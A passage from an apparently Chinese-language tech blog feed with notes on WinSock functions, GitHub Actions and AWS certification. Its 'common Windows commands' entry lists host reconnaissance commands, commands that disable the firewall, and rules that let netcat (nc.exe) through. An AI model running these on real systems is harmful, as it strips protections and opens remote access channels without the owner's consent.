型別的值，以表示新的Socket描述子</li></ul></li><li><strong>recv</strong><ul><li>接收客戶端發送的資料</li><li>接收四個參數: Socket描述子、接收緩衝區的pointer、緩衝區的大小和接收選項</li><li><pre><code class="c=">int WSAAPI recv(   [in]  SOCKET s,   [out] char   *buf,   [in]  int    len,   [in]  int    flags );<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">    - 回傳整數</span><br><span class="line">- **send**</span><br><span class="line">    -  發送資料到客戶端</span><br><span class="line">    -  他接受四個參數: Socket描述子、發送緩衝區的pointer、緩衝區的大小和發送選項</span><br><span class="line">    -  ```c=</span><br><span class="line">       int WSAAPI send(</span><br><span class="line">         [in] SOCKET     s,</span><br><span class="line">         [in] const char *buf,</span><br><span class="line">         [in] int        len,</span><br><span class="line">         [in] int        flags</span><br><span class="line">        );</span><br></pre></td></tr></table></figure></code></pre></li><li>回傳整數</li></ul></li><li><strong>closesocket</strong><ul><li>關閉Socket</li><li>接收一個socket 描述子作為參數</li><li><pre><code class="c=">int WSAAPI closesocket(    [in] SOCKET s);  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">    - 回傳整數</span><br><span class="line">- **WSACleanup**</span><br><span class="line">    - 清理WinSock函式庫的資源，不接收任何參數，並回傳整數</span><br><span class="line">    - ```c=</span><br><span class="line">      int WSAAPI WSACleanup();</span><br></pre></td></tr></table></figure></code></pre></li></ul></li></ul><p>上述函式中任何回傳整數的函式，若回傳值為0，則為函式呼叫成功，否則為Error code</p>]]></content>
      
      
      <categories>
          
          <category> 學習筆記 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 網路程式 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>💻 Windows 常見指令</title>
      <link href="/posts/5b6eeeb3.html"/>
      <url>/posts/5b6eeeb3.html</url>
      
        <content type="html"><![CDATA[<h2 id="蒐集本機資訊"><a href="#蒐集本機資訊" class="headerlink" title="蒐集本機資訊"></a>蒐集本機資訊</h2><ul><li>網路設定資訊<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ipconfig/all</span><br></pre></td></tr></table></figure></li><li>作業系統以及版本資訊<ul><li>中文版  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systeminfo | findstr /B /C:&quot;作業系統名稱&quot; /C:&quot;作業系統版本&quot;</span><br></pre></td></tr></table></figure></li><li>英文版  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systeminfo | findstr /B /C:&quot;OS Name&quot; /C:&quot;OS Version&quot;</span><br></pre></td></tr></table></figure></li></ul></li><li>系統結構<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo %PROCESSOR_ARCHITECTURE%</span><br></pre></td></tr></table></figure></li><li>查看安裝的軟體版本<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic product get name,version</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell &quot;Get-WmiObject -class Win32_Product |Select-Object -Property name,version&quot;</span><br></pre></td></tr></table></figure></li><li>查詢本機服務<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic service list brief</span><br></pre></td></tr></table></figure></li><li>查詢處理程序列表<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tasklist</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic process list brief</span><br></pre></td></tr></table></figure></li><li>查看啟動程式<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic startup get command,caption</span><br></pre></td></tr></table></figure></li><li>查看任務計畫<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">schtasks /query /fo LIST /v</span><br></pre></td></tr></table></figure></li><li>查看主機開機時間<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net statistics workstation</span><br></pre></td></tr></table></figure></li><li>查看使用者列表<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net user</span><br></pre></td></tr></table></figure></li><li>獲取本機管理員資訊<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net localgroup administrators</span><br></pre></td></tr></table></figure></li><li>查看當前線上使用者<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">query user || qwinsta</span><br></pre></td></tr></table></figure></li><li>列出本機電腦以及所連接的用戶端之間的Session<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net session //通常需要admin 權限才能執行</span><br></pre></td></tr></table></figure></li><li>查詢通訊埠列表<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netstat -ano</span><br></pre></td></tr></table></figure></li><li>查路由表以及可用的ARP Cache表<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">route print</span><br><span class="line">arp -a</span><br></pre></td></tr></table></figure></li><li>關閉防火牆<ul><li>Windows Server 2003及以前的版本  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netsh firewall set opmode disable</span><br></pre></td></tr></table></figure></li><li>Windows Server 2003之後的版本  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netsh advfirewall set allprofiles state off</span><br></pre></td></tr></table></figure></li></ul></li><li>查看防火牆設定<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netsh firewall show config</span><br></pre></td></tr></table></figure></li><li>修改防火牆設定<ul><li>Windows Server 2003及以前的版本  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netsh firewall add allowedprogram C:\nc.exe &quot;allow nc&quot; enable</span><br></pre></td></tr></table></figure></li><li>Windows Server 2003之後的版本  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netsh advfirewall add rule name=&quot;pass nc&quot; dir=in action=allow program=&quot;C:\nc.exe&quot;</span><br></pre></td></tr></table></figure></li><li>允許指定程式退出  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netsh advfirewall add rule name=&quot;Allow nc&quot; dir=out action=allow program=&quot;C:\nc.exe&quot;</span><br></pre></td></tr></table></figure></li><li>允許3389 Port通行  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netsh advfirewall add rule name=&quot;Remote Desktop&quot; protocol=TCP dir=in localport=3389 action=allow</span><br></pre></td></tr></table></figure></li></ul></li><li>自訂防火牆紀錄檔的儲存位置<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netsh advfirewall set currentprofile logging filename &quot;C:\windows\temp\fw.log&quot;</span><br></pre></td></tr></table></figure></li></ul>]]></content>
      
      
      <categories>
          
          <category> 指令/工具用法整理 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Windows </tag>
            
            <tag> PowerShell </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>📑Github Action 學習筆記</title>
      <link href="/posts/24be9e02.html"/>
      <url>/posts/24be9e02.html</url>
      
        <content type="html"><![CDATA[<p><img src="https://i.imgur.com/zn0lCzN.png"></p><p>我以前其實沒有CI&#x2F;CD的經驗，所以現有常見的CI&#x2F;CD平台其實都沒有太過了解，但近期因專案需求，需要透過Github Action　來建立一個用於Azure認知服務中的<strong>斷句API (BreakSentence API)</strong> 的CI&#x2F;CD Pipeline，在被交付的需求還很模糊的狀況下😭，還是先來了解這項功能，並且做個紀錄。</p><h2 id="基本介紹"><a href="#基本介紹" class="headerlink" title="基本介紹"></a>基本介紹</h2><p>是一個CI&#x2F;CD平台，能夠自動化建置(Build)、測試(Test)以及部署(Deployment)，使用者可以建立工作流程(Workflow)來建置以及測試每個對Repository的pull請求或者是將合併的pull請求部署到生產環境。</p><h2 id="Components"><a href="#Components" class="headerlink" title="Components"></a>Components</h2><p>構成Github Actions中的元件名詞如下</p><ul><li>Workflow</li><li>Event</li><li>Jobs</li><li>Runner</li><li>Steps</li><li>Action</li></ul><p>先講這些元件的合作起來的行為會是怎麼樣: 當Repository中發生某個 <strong>事件(Event)<strong>，此時你所設定的 Github Actions <strong>Workflows</strong> 被觸發。這裡的事件，舉例來說可以是</strong>一個pull request請求</strong>或是<strong>某個issued被建立</strong> 等等。</p><p><img src="https://i.imgur.com/SuvKp3J.png" alt="&#39;Github Action workflows&#39;"></p><p>你所定義的Workflow當中包含了一個或多個 <strong>Jobs</strong> ，這些Jobs可以是被<strong>平行處理(Parallel)</strong> 或是 <strong>依序處理(Sequential)</strong> ，每個Jobs會在自己的虛擬機Runner被處理，或者是在容器內運行。而每個Jobs中有包含了一個或多個 <strong>Steps</strong> ，會執行你定義的腳本或是某個 <strong>Action</strong>，Action是Github Action當中的最小單位，是一個可重複使用的擴展，通常是某些通用指令(?😥)</p><h2 id="🔀Workflows"><a href="#🔀Workflows" class="headerlink" title="🔀Workflows"></a>🔀Workflows</h2><ul><li>一個可設定來自動化流程的一個或多個Jobs被稱作為Workflow，可以透過撰寫YAML檔來定義Workflow,並在Event發生時被觸發，也可以手動觸發。</li><li>Workflow被定義在Repo中的 <code>.github/workflows</code> 路徑底下</li><li>一個Repo可以有多個Workflows，並負責執行各種不同的任務<ul><li>像是，一個用於Build跟Test的Workflow</li><li>另一個則是在Release發布後部署應用到生產環境的Workflow</li></ul></li></ul><h2 id="✴️Events"><a href="#✴️Events" class="headerlink" title="✴️Events"></a>✴️Events</h2><p>Event代表在Repository中的特定行為，像是:</p><ul><li>pull request</li><li>open issues</li><li>psuhes a commit to repo …etc</li></ul><p>用於觸發Workflows的Event可以參考這份文件<br><a href="https://docs.github.com/en/actions/using-workflows/events-that-trigger-workflows">https://docs.github.com/en/actions/using-workflows/events-that-trigger-workflows</a></p><h2 id="🗂️Jobs"><a href="#🗂️Jobs" class="headerlink" title="🗂️Jobs"></a>🗂️Jobs</h2><p>一組Steps被稱作Job,並且執行在Runner上，每個Steps可能會是一個Shell Script或是Action被執行。Steps會依序執行，且由於每個Steps是在相同的Runner上被執行，因此可以在不同Steps之間共享相同資料。 舉例： 一個step建置完應用後另一個step來測試應用。</p><p>你也可以設定Jobs的依賴項，一旦一個Jobs依賴另一個Job，則會等待另一個Job完成後才開始執行自己的任務。<br><a href="https://docs.github.com/en/actions/using-jobs">https://docs.github.com/en/actions/using-jobs</a></p><h2 id="📑Actions"><a href="#📑Actions" class="headerlink" title="📑Actions"></a>📑Actions</h2><p>Action是一個專為Github Action平台設計的程序，可執行複雜、高頻率且重複的工作。<br>透過Action可以減少出現在workflow檔案中大量重複的程式碼。<br>一個Action可以做到像是從Github當中拉取repository，並為所建置的環境設定正確的工具集，並設定好與你的雲端供應用商之間的身分驗證。</p><p>設定Action:<a href="https://docs.github.com/en/actions/creating-actions">https://docs.github.com/en/actions/creating-actions</a></p><h2 id="📦Runners"><a href="#📦Runners" class="headerlink" title="📦Runners"></a>📦Runners</h2><p>用於運行workflow的Server，每個Runner一次只會執行一個Job。<br>Github提供 Ubuntu、Windows以及MacOS Runner來執行Workflow。<br>也會大型Runner需求者提供解決方案:<a href="https://docs.github.com/en/actions/using-github-hosted-runners/using-larger-runners">https://docs.github.com/en/actions/using-github-hosted-runners/using-larger-runners</a><br>若所需執行環境需要不同的OS或特規硬體設定，使用者也可以host自己的Runner <a href="https://docs.github.com/en/actions/hosting-your-own-runners">https://docs.github.com/en/actions/hosting-your-own-runners</a></p><h2 id="建立-Workflow"><a href="#建立-Workflow" class="headerlink" title="建立 Workflow"></a>建立 Workflow</h2><p>Github Action 使用YAML來建立Workflow。每個 Workflow 都以獨立的YAML檔儲存，並且放置在 <code>.github/workflows</code> 路徑底下</p><h2 id="建立範例-Workflows"><a href="#建立範例-Workflows" class="headerlink" title="建立範例 Workflows"></a>建立範例 Workflows</h2><ul><li>建立路徑:  <code>.gituhb/workflows</code></li><li>在 <code>.github/workflows</code> 當中建立 <code>learn-github-action.yml</code><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">name:</span> <span class="string">learn-github-actions</span></span><br><span class="line"><span class="attr">run-name:</span> <span class="string">$&#123;&#123;</span> <span class="string">github.actor</span> <span class="string">&#125;&#125;</span> <span class="string">is</span> <span class="string">learning</span> <span class="string">GitHub</span> <span class="string">Actions</span></span><br><span class="line"><span class="attr">on:</span> [<span class="string">push</span>]</span><br><span class="line"><span class="attr">jobs:</span></span><br><span class="line">  <span class="attr">check-bats-version:</span></span><br><span class="line">    <span class="attr">runs-on:</span> <span class="string">ubuntu-latest</span></span><br><span class="line">    <span class="attr">steps:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">uses:</span> <span class="string">actions/checkout@v3</span></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">uses:</span> <span class="string">actions/setup-node@v3</span></span><br><span class="line">        <span class="attr">with:</span></span><br><span class="line">          <span class="attr">node-version:</span> <span class="string">&#x27;14&#x27;</span></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">run:</span> <span class="string">npm</span> <span class="string">install</span> <span class="string">-g</span> <span class="string">bats</span></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">run:</span> <span class="string">bats</span> <span class="string">-v</span></span><br></pre></td></tr></table></figure></li><li>commit 這次的更動，並 push 到 repository</li></ul><h2 id="Workflows-File-逐行解釋"><a href="#Workflows-File-逐行解釋" class="headerlink" title="Workflows File 逐行解釋"></a>Workflows File 逐行解釋</h2><p>參考: <a href="https://docs.github.com/en/actions/using-workflows/workflow-syntax-for-github-actions#onpushpull_requestpull_request_targetpathspaths-ignore">Workflow Syntax</a></p><ul><li><code>name</code> : 指定Workflow名稱，並會出現在Repository中的Action Tab</li><li><code>run-name</code> : 每次運行該Workflow時會出現的文字訊息，這邊指定 repo username + “is learning Github Actions”</li></ul><p><img src="https://i.imgur.com/B5l23tf.png"></p><ul><li><code>on</code> : 指定會觸發 Workflows 的行為，這裡使用 <code>push</code> event，所以依但有人 push更動到 repository，則會觸發 Workflows的執行</li><li><code>jobs</code> : 將 Workflows當中的job組合在一起</li><li><code>check-bats-version</code> : 自定義Job的名稱</li><li><code>runs-on</code>: 設定Job執行在OS為最新版本的Ubuntu Linux的Runner上，此指定會觸發Hosted所託管的虛擬機被建立。</li><li><code>steps</code>: 將 <code>check-bats-version</code> job 底下的所有step組合再一起</li><li><code>uses</code>:　用來指定step的命令或行為<ul><li><code>actions/checkout@v3</code>: 代表要執行v3版本的actions&#x2F;checkout行為，<strong>此步驟會將你的repo checkout到Runner上，並允許你針對你的程式進行操作，每當你的Workflow將針對Repository的程式運行時，都應該使用 checkout 操作</strong></li><li><code>actions/setup-node@v3</code>: 此步驟會安裝指定版本的NodeJS(此範例中視版本1)</li></ul></li><li><code>run</code> : run指令會告訴 job在Runner中執行特定指令，此範例終究是告訴Job在Runner中執行 npm install bats，以及下一步則是去查看 bats版本</li></ul><h2 id="尋找以及自定義-Actions"><a href="#尋找以及自定義-Actions" class="headerlink" title="尋找以及自定義 Actions"></a>尋找以及自定義 Actions</h2><p>一個Action可以被定義在:</p><ul><li>與你Workflow檔案相同的Repository當中</li><li>所有公開的Repository</li><li>DockerHub中的已發布的容器image當中</li></ul><h3 id="Github-Action-Martketplace"><a href="#Github-Action-Martketplace" class="headerlink" title="Github Action Martketplace"></a>Github Action Martketplace</h3><p><a href="https://github.com/marketplace?type=actions">Marketplace連結</a></p><p><img src="https://i.imgur.com/oFXdxsj.png"></p><p>在Marketplace 當中有許多其他貢獻者所提供的Action，可以下載</p><p><img src="https://i.imgur.com/TFdKxou.png"></p><p>每個Action當中會有提供相應的YAML Synatx可以複製並貼上至自己的Workflow檔案當中，若Action需要你提供Input，則需要額外設定Workflow，可參考這份文件<br>，<a href="https://docs.github.com/en/actions/learn-github-actions/finding-and-customizing-actions#using-inputs-and-outputs-with-an-action">https://docs.github.com/en/actions/learn-github-actions/finding-and-customizing-actions#using-inputs-and-outputs-with-an-action</a></p><h3 id="在相同Repository底下添加-Action"><a href="#在相同Repository底下添加-Action" class="headerlink" title="在相同Repository底下添加 Action"></a>在相同Repository底下添加 Action</h3><p><em>範例檔案結構</em></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">|-- hello-world (repository)</span><br><span class="line">|   |__ .github</span><br><span class="line">|       └── workflows</span><br><span class="line">|           └── my-first-workflow.yml</span><br><span class="line">|       └── actions</span><br><span class="line">|           |__ hello-world-action</span><br><span class="line">|               └── action.yml</span><br></pre></td></tr></table></figure><p><em>範例 Workflow 檔</em></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">jobs:</span><br><span class="line">  build:</span><br><span class="line">    runs-on: ubuntu-latest</span><br><span class="line">    steps:</span><br><span class="line">      # This step checks out a copy of your repository.</span><br><span class="line">      - uses: actions/checkout@v3</span><br><span class="line">      # This step references the directory that contains the action.</span><br><span class="line">      - uses: ./.github/actions/hello-world-action</span><br></pre></td></tr></table></figure><p>synatx: <code>./path/to/dir</code></p><p>而 action.yml 是為了Action提供Metadata用的。</p><h3 id="從不同-Repository-加入-Action"><a href="#從不同-Repository-加入-Action" class="headerlink" title="從不同 Repository 加入 Action"></a>從不同 Repository 加入 Action</h3><p>這時在你的workflow檔當中的 use 底下就需要指定 <code>&#123;owner&#125;/&#123;repo&#125;@&#123;ref&#125;</code> 來標明 reference action的repo，範例:  <code>actions/setup-node@v3</code></p><h3 id="引用-DockerHub上的容器"><a href="#引用-DockerHub上的容器" class="headerlink" title="引用 DockerHub上的容器"></a>引用 DockerHub上的容器</h3><p>此時 syntax需要改成: <code>docker://&#123;image&#125;:&#123;tag&#125;</code></p><h2 id="實作-Azure-Break-Sentence-CI-x2F-CD-Pipeline"><a href="#實作-Azure-Break-Sentence-CI-x2F-CD-Pipeline" class="headerlink" title="實作: Azure Break Sentence CI&#x2F;CD Pipeline"></a>實作: Azure Break Sentence CI&#x2F;CD Pipeline</h2><p><em>整體架構圖</em><br><img src="https://i.imgur.com/OvSfq3m.png"></p><h3 id="Event需求"><a href="#Event需求" class="headerlink" title="Event需求"></a>Event需求</h3><h3 id="Runner-環境套件設定"><a href="#Runner-環境套件設定" class="headerlink" title="Runner 環境套件設定"></a>Runner 環境套件設定</h3><ul><li>OS: Ubuntu Linux</li><li>Python 3.8.10</li><li>Environment Variables<ul><li>AZURE_API_KEY</li><li>AZURE_LOCATION</li></ul></li></ul><blockquote><p>感覺可以自定義Actions</p></blockquote><h3 id="Break-Sentence"><a href="#Break-Sentence" class="headerlink" title="Break Sentence"></a>Break Sentence</h3><p><img src="https://i.imgur.com/kd6kJ2X.png"></p><p>🧪目標: <strong>在使用者上傳檔案時，就能夠擷取裡面的文章，去呼叫BreakSentence.py 進行斷句，再保存到特定Ouput Folder</strong></p><h3 id="Task"><a href="#Task" class="headerlink" title="Task"></a>Task</h3><ul><li><input checked="" disabled="" type="checkbox"> Azure API Key 被Disable  -&gt; 變更信箱重新註冊或付費續訂</li><li><input checked="" disabled="" type="checkbox"> 測試 YML檔透過環境變數方式來存取Secrets</li><li><input checked="" disabled="" type="checkbox"> 變更Repository中所存放的Secrets值</li><li><input checked="" disabled="" type="checkbox"> <code>BreakSentence.py</code> -&gt; 需加上讀檔功能<ul><li><input disabled="" type="checkbox"> 可能要可以開文字檔以及Excel檔</li></ul></li><li><input checked="" disabled="" type="checkbox"> <code>BreakSentence.py</code> -&gt; 要包裝成指令工具</li></ul><p><img src="https://i.imgur.com/xnAfxMl.png"><br><del>目前在Setup Python就會出錯</del> ✅已解決</p><p><img src="https://i.imgur.com/Sz9BA33.png"><br><del>沒有指定 Module，需用pip 指令安裝特定模組</del> ✅已解決</p><p><img src="https://i.imgur.com/McSwZ3L.png"><br><del>無法存取Secret中的值作為環境變數</del> ✅已解決<br>需要將env 區段放到run breaksentence.py的區段底下<br><img src="https://i.imgur.com/tlKx4k7.png"></p><p><img src="https://i.imgur.com/2AFUYyK.png"><br>執行成功 </p><p><img src="https://i.imgur.com/ortWe1v.png"></p><p>目前腳本中只有把api call的reponse印出來以及切句子存在List<br>下一步驟就是改變輸入輸出方式</p><h2 id="參考資料"><a href="#參考資料" class="headerlink" title="參考資料"></a>參考資料</h2><p>[1]<a href="https://ithelp.ithome.com.tw/articles/10266827">https://ithelp.ithome.com.tw/articles/10266827</a><br>[2]<a href="https://docs.github.com/en/actions/learn-github-actions/understanding-github-actions">https://docs.github.com/en/actions/learn-github-actions/understanding-github-actions</a><br>[3]<a href="https://docs.github.com/en/actions/learn-github-actions/finding-and-customizing-actions">https://docs.github.com/en/actions/learn-github-actions/finding-and-customizing-actions</a><br>[4] <a href="https://ithelp.ithome.com.tw/articles/10266828">Github Action Push到Azure雲端</a></p>]]></content>
      
      
      <categories>
          
          <category> 學習筆記 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CI/CD </tag>
            
            <tag> GitHub </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>🔋 AWS Certified Cloud Practitioner 證照準備筆記</title>
      <link href="/posts/e8acb5ee.html"/>
      <url>/posts/e8acb5ee.html</url>
      
        <content type="html"><![CDATA[<p><img src="https://i.imgur.com/x1Sq6so.png"></p><h1 id="CCP-準備"><a href="#CCP-準備" class="headerlink" title="CCP 準備"></a>CCP 準備</h1><ul><li><p><strong>考試指南</strong>: <a href="https://d1.awsstatic.com/zh_TW/training-and-certification/docs-cloud-practitioner/AWS-Certified-Cloud-Practitioner_Exam-Guide.pdf">https://d1.awsstatic.com/zh_TW/training-and-certification/docs-cloud-practitioner/AWS-Certified-Cloud-Practitioner_Exam-Guide.pdf</a></p></li><li><p><strong>考試題型占比</strong><br><img src="https://i.imgur.com/xv5xcGu.png"></p></li><li><p><strong>相關資源</strong></p><ul><li><a href="https://terahake.in/post/aws-ccp-certified-exp/">https://terahake.in/post/aws-ccp-certified-exp/</a></li><li><a href="https://awslc.medium.com/aws-cloud-practitioner%E8%AD%89%E7%85%A7%E6%BA%96%E5%82%99-6b8bacc6a490">https://awslc.medium.com/aws-cloud-practitioner%E8%AD%89%E7%85%A7%E6%BA%96%E5%82%99-6b8bacc6a490</a></li><li><a href="https://jayendrapatil.com/aws-certified-cloud-practitioner-exam-learning-path/?fbclid=IwAR3eiyroyZ_jTn2pA5ut_ophP8JNCzgspERnug_luC_HGltA-OkLwRwrhAU">https://jayendrapatil.com/aws-certified-cloud-practitioner-exam-learning-path/?fbclid=IwAR3eiyroyZ_jTn2pA5ut_ophP8JNCzgspERnug_luC_HGltA-OkLwRwrhAU</a></li><li><a href="https://d1.awsstatic.com/whitepapers/AWS_Cloud_Best_Practices.pdf?fbclid=IwAR1xXOBkWwESyy_9Srngna7rAbP_g1ddYMl2KO3moKJbzz1YDgrNOrv_z08">https://d1.awsstatic.com/whitepapers/AWS_Cloud_Best_Practices.pdf?fbclid=IwAR1xXOBkWwESyy_9Srngna7rAbP_g1ddYMl2KO3moKJbzz1YDgrNOrv_z08</a></li><li><a href="https://d0.awsstatic.com/whitepapers/aws_pricing_overview.pdf?fbclid=IwAR2mDUgA-IDHrqrQFGn3XL1kA0O1XojD6d6rdxwLWmvuL4D4mi4DKeDNonQ">https://d0.awsstatic.com/whitepapers/aws_pricing_overview.pdf?fbclid=IwAR2mDUgA-IDHrqrQFGn3XL1kA0O1XojD6d6rdxwLWmvuL4D4mi4DKeDNonQ</a></li><li><a href="http://yhhuang1966.blogspot.com/2020/03/aws-aws-certified-cloud-practitioner.html">http://yhhuang1966.blogspot.com/2020/03/aws-aws-certified-cloud-practitioner.html</a></li></ul></li><li><p><strong>模擬考體</strong></p><ul><li><a href="https://www.examtopics.com/exams/amazon/aws-certified-cloud-practitioner/">https://www.examtopics.com/exams/amazon/aws-certified-cloud-practitioner/</a></li></ul></li></ul><h2 id="Well-Architect五大支柱"><a href="#Well-Architect五大支柱" class="headerlink" title="Well-Architect五大支柱"></a>Well-Architect五大支柱</h2><ul><li>卓越營運<ul><li>能夠執行和監控系統以實現商業價值，並持續提升支援流程和程序的能力。</li></ul></li><li>安全性<ul><li>是保護資訊、系統和資產，同時透過風險評估和緩解策略來實現商業價值的能力</li></ul></li><li>可靠性<ul><li>從基礎設施或服務中斷中恢復</li><li>動態取得運算資源以滿足需求</li><li>減少配置不當或暫時性網路問題等中斷情況</li></ul></li><li>效能達成效率<ul><li>用運算資源以符合系統需求，並在需求變化和技術升級時維持效率的能力</li></ul></li><li>成本最佳化<ul><li>是能以最低價格點執行系統來提供商業價值的能力。</li></ul></li></ul><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><h3 id="Amazon-Athena"><a href="#Amazon-Athena" class="headerlink" title="Amazon Athena"></a>Amazon Athena</h3><ul><li>透過標準SQL互動式Query來在S3當中分析資料</li><li>無伺服器</li><li>可定義Schema並藉由SQL來在S3當中分析資料</li></ul><h3 id="Amazon-Kinesis"><a href="#Amazon-Kinesis" class="headerlink" title="Amazon Kinesis"></a>Amazon Kinesis</h3><ul><li>可以輕鬆地蒐集、處例並分析即時串流資料</li><li>像是影音串流、應用程式日誌、網頁點擊分析、IoT遙測資料等等<ul><li>Amazon Kinesis Data Firhose</li><li>Amazon Kinesis Data Analytics</li><li>Amazon Kinesis Data Streams</li><li>Amazon Kinesis Video Streams</li></ul></li></ul><h3 id="Amazon-QuickSight"><a href="#Amazon-QuickSight" class="headerlink" title="Amazon QuickSight"></a>Amazon QuickSight</h3><ul><li>強大的BI(Business intelligent)服務</li><li>可建立互動式dashboard</li></ul><h2 id="應用程式整合"><a href="#應用程式整合" class="headerlink" title="應用程式整合"></a>應用程式整合</h2><h3 id="Amazon-Simple-Notification-Service-Amazon-SNS"><a href="#Amazon-Simple-Notification-Service-Amazon-SNS" class="headerlink" title="Amazon Simple Notification Service (Amazon SNS)"></a>Amazon Simple Notification Service (Amazon SNS)</h3><ul><li>一種發布&#x2F;訂閱服務。如使用 Amazon SNS 主題，發布者可將訊息發布給訂閱者。這種方式如同在咖啡店裡，收銀員向製作飲料的咖啡師提供咖啡訂單一樣。</li><li>在 Amazon SNS 中，訂閱者可能是 Web 伺服器、電子郵件地址、AWS Lambda 函數或其他幾種選項</li></ul><h3 id="Amazon-Simple-Queue-Service-Amazon-SQS"><a href="#Amazon-Simple-Queue-Service-Amazon-SQS" class="headerlink" title="Amazon Simple Queue Service (Amazon SQS)"></a>Amazon Simple Queue Service (Amazon SQS)</h3><ul><li>Amazon Simple Queue Service (Amazon SQS) 是一種訊息佇列服務</li><li>在 Amazon SQS 中，應用程式會將訊息傳送到佇列中。使用者或服務會從佇列擷取訊息，加以處理後，從佇列中刪除訊息</li><li></li></ul><h2 id="運算和無伺服器"><a href="#運算和無伺服器" class="headerlink" title="運算和無伺服器"></a>運算和無伺服器</h2><h3 id="AWS-Batch"><a href="#AWS-Batch" class="headerlink" title="AWS Batch"></a>AWS Batch</h3><h3 id="Amazon-EC2"><a href="#Amazon-EC2" class="headerlink" title="Amazon EC2"></a>Amazon 